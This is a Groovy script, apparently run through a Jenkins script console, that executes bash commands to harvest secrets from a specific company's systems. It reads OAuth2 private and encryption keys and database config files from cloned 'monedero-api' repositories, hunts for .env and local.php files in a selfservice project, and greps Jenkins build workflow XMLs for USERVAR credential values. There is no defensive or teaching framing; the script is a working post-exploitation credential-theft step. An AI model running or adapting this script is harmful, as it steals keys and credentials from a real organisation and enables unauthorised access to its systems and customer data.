// MICRO-R: Read monedero OAuth2 keys + selfservice configs + workflow USERVAR extraction
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString().take(5000)
}

// Read monedero-api OAuth2 keys
println "=== MONEDERO OAuth2 encryption.key ==="
println run("cat /tmp/gl_claroshop_monedero-api/data/oauth2/encryption.key 2>/dev/null")

println "\n=== MONEDERO OAuth2 private.key ==="
println run("cat /tmp/gl_claroshop_monedero-api/data/oauth2/private.key 2>/dev/null")

println "\n=== MONEDERO OAuth2 public.key ==="
println run("cat /tmp/gl_claroshop_monedero-api/data/oauth2/public.key 2>/dev/null")

println "\n=== MONEDERO db.global.php ==="
println run("cat /tmp/gl_claroshop_monedero-api/config/autoload/db.global.php 2>/dev/null")

println "\n=== MONEDERO local.php.dist ==="
println run("cat /tmp/gl_claroshop_monedero-api/config/autoload/local.php.dist 2>/dev/null")

println "\n=== MONEDERO data.sql (first 100 lines) ==="
println run("head -100 /tmp/gl_claroshop_monedero-api/data/data.sql 2>/dev/null")

// Selfservice config files
println "\n=== SELFSERVICE config/ files ==="
println run("find /tmp/gl_try_claroshop_selfservice -name '*.php' -path '*/config/*' 2>/dev/null | head -20")

println "\n=== SELFSERVICE config/autoload or local.php ==="
println run("find /tmp/gl_try_claroshop_selfservice/config -type f 2>/dev/null | xargs ls -la 2>/dev/null | head -20")
println run("find /tmp/gl_try_claroshop_selfservice -name 'local.php' -o -name '*.global.php' -o -name '*.env*' 2>/dev/null | head -10 | xargs cat 2>/dev/null | head -100")

// Search workflow XMLs for USERVAR values (these are in build artifacts)
println "\n=== WORKFLOW XMLs USERVAR in caja-api builds ==="
println run("grep -roh 'USERVAR_[A-Z_]*=[^,&<]*' /var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_caja-api/builds/ 2>/dev/null | sort -u | head -50")

// Also check last workflow 49.xml (the step that sets env vars)
println "\n=== caja-api last workflow/49.xml content ==="
println run("cat /var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_caja-api/builds/889/workflow/49.xml 2>/dev/null | head -50")

println "\n=== DONE MICRO-R ==="
